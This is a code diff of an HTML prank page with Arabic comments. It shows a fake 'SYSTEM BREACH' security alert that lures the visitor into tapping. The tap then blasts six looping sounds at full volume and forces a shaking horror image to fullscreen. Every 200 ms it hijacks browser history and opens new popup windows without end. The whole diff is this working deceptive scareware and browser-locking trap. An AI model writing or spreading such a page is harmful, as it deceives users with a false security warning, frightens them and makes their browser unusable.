@@ -3,93 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Alert</title>
+    <title>CRITICAL ERROR</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
         
-        /* الصورة كبيرة وواضحة ومستعدة للهبال سواسوة */
-        #madwoman { 
+        /* الصورة كبيرة تعمر الشاشة ومخفية في البداية سواسوة */
+        #horrorImg { 
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
-            object-fit: cover; z-index: 1; display: none;
-            will-change: transform;
+            object-fit: cover; display: none; z-index: 10;
         }
 
-        /* رسالة التحذير سواسوة */
-        #ui { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #111; z-index: 1000; display: flex; 
-            flex-direction: column; justify-content: center; align-items: center;
-            font-family: sans-serif; color: #fff;
+        /* واجهة التحذير سواسوة */
+        #overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; color: #f00; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; z-index: 100;
+            font-family: monospace; text-align: center;
         }
-        .btn-fix { 
-            background: #d32f2f; color: #fff; border: none; padding: 20px 50px; 
-            border-radius: 5px; font-size: 20px; cursor: pointer; font-weight: bold;
+        .btn { 
+            background: #f00; color: #000; border: none; padding: 25px 60px;
+            font-size: 24px; font-weight: bold; cursor: pointer; margin-top: 20px;
         }
     </style>
 </head>
-<body onclick="launchChaos()">
+<body onclick="startTheHell()">
 
-    <div id="ui">
-        <h2 style="color: #ff5252;">⚠️ FATAL ERROR ⚠️</h2>
-        <p style="text-align: center; padding: 0 20px;">System integrity compromised.<br>Tap to repair filesystem.</p>
-        <button class="btn-fix">REPAIR NOW</button>
+    <div id="overlay">
+        <h1 style="font-size: 40px;">⚠️ SYSTEM BREACH ⚠️</h1>
+        <p>Unauthorized access detected.<br>Tap to secure your device now.</p>
+        <button class="btn">SECURE NOW</button>
     </div>
 
-    <img id="madwoman" src="https://i.ibb.co/39snnynW/1000016067.jpg">
+    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
-    <div id="sounds">
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3"></audio>
+    <div id="audioGroup">
+        <audio class="track" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
+        <audio class="track" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
+        <audio class="track" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
+        <audio class="track" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3"></audio>
+        <audio class="track" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
+        <audio class="track" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3"></audio>
     </div>
 
     <script>
-        let aCtx, analyser, data;
-        const img = document.getElementById('madwoman');
+        let context, analyser, dataArray;
+        const img = document.getElementById('horrorImg');
 
-        function launchChaos() {
-            // 1. تشغيل الـ 6 أصوات في رحبة سواسوة
-            document.querySelectorAll('.h').forEach(a => { a.volume = 1.0; a.play(); });
+        function startTheHell() {
+            // 1. إطلاق الـ 6 أصوات مع بعض سواسوة
+            const tracks = document.querySelectorAll('.track');
+            tracks.forEach(t => { t.volume = 1.0; t.play(); });
 
-            document.getElementById('ui').style.display = 'none';
+            // 2. إظهار الصورة وتفعيل الفول سكرين سواسوة
+            document.getElementById('overlay').style.display = 'none';
             img.style.display = 'block';
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
 
-            // 2. تفعيل المحرك البصري فوراً سواسوة
-            if (!aCtx) {
-                aCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const source = aCtx.createMediaElementSource(document.querySelectorAll('.h')[2]); // قوقو قاقا هو المحرك
-                analyser = aCtx.createAnalyser();
-                analyser.fftSize = 128;
-                data = new Uint8Array(analyser.frequencyBinCount);
+            // 3. بناء المحرك الحركي سواسوة
+            if (!context) {
+                context = new (window.AudioContext || window.webkitAudioContext)();
+                const source = context.createMediaElementSource(tracks[2]); // نربط الحركة بصوت قوقو قاقا
+                analyser = context.createAnalyser();
+                analyser.fftSize = 64;
+                dataArray = new Uint8Array(analyser.frequencyBinCount);
                 source.connect(analyser);
-                analyser.connect(aCtx.destination);
-                if (aCtx.state === 'suspended') aCtx.resume();
-                animate();
+                analyser.connect(context.destination);
+                context.resume().then(() => {
+                    requestAnimationFrame(renderMadness);
+                });
             }
 
-            // 3. نظام الحبس واللاق سواسوة
+            // 4. نظام الحبس الرقمي سواسوة
             setInterval(() => {
                 history.pushState(null, null, window.location.href);
                 window.open(window.location.href, '_blank', 'width=10,height=10');
             }, 200);
         }
 
-        function animate() {
-            analyser.getByteFrequencyData(data);
-            let volume = data.reduce((a, b) => a + b) / data.length;
+        function renderMadness() {
+            analyser.getByteFrequencyData(dataArray);
+            let volume = dataArray[0]; // نعتمد على أول تردد للسرعة سواسوة
 
-            // 4. الرعشة الهستيرية: تتحرك الصورة مع الأصوات سواسوة
-            const intensity = (volume / 255) * 80; 
-            const x = (Math.random() - 0.5) * intensity * 3;
-            const y = (Math.random() - 0.5) * intensity * 3;
-            const r = (Math.random() - 0.5) * intensity;
-            const sc = 1 + (volume / 255) * 0.5;
+            // 5. معادلة الرعشة الهستيرية سواسوة
+            const jitter = (volume / 255) * 60; // شدة الاهتزاز
+            const x = (Math.random() - 0.5) * jitter * 2;
+            const y = (Math.random() - 0.5) * jitter * 2;
+            const rotate = (Math.random() - 0.5) * (jitter / 2);
+            const scale = 1 + (volume / 255) * 0.4;
 
-            img.style.transform = `translate(${x}px, ${y}px) rotate(${r}deg) scale(${sc})`;
-            requestAnimationFrame(animate);
+            img.style.transform = `translate(${x}px, ${y}px) rotate(${rotate}deg) scale(${scale})`;
+            
+            requestAnimationFrame(renderMadness);
         }
     </script>
 </body>
